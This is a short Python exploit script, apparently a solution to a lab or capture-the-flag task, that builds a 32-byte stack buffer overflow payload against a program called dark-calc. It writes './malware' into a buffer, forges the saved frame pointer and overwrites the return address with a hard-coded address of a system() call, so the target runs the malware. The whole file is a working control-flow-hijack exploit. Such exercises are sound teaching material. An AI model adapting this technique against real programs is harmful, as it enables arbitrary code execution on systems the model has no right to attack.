#!/usr/bin/env python3
"""Task: make attack/dark-calc execute ./malware.

Stack layout of input() (64-bit):

    rbp-0x10 : char expression[16]
    rbp     : saved rbp
    rbp+8   : saved return address

The payload fills the 16-byte buffer, overwrites the saved return address
with the instruction inside eval() that calls system(command_buf).  Before
that instruction, input() has already executed strcpy(command_buf, expression),
so command_buf contains "./malware".

The fake saved rbp is main()'s rbp.  After system() returns, eval()'s
leave/ret therefore unwinds back into __wrap_main instead of looping.
"""

import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


payload = bytearray()
payload += b"./malware\x00"          # copied into command_buf by strcpy
payload += b"A" * 6                  # pad the 16-byte expression buffer
payload += p64(0x721000800FF0)       # fake saved rbp = main()'s rbp
payload += p64(0x401A6B)             # mov edi, 0x6030d0; call system@plt

assert len(payload) == 32
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
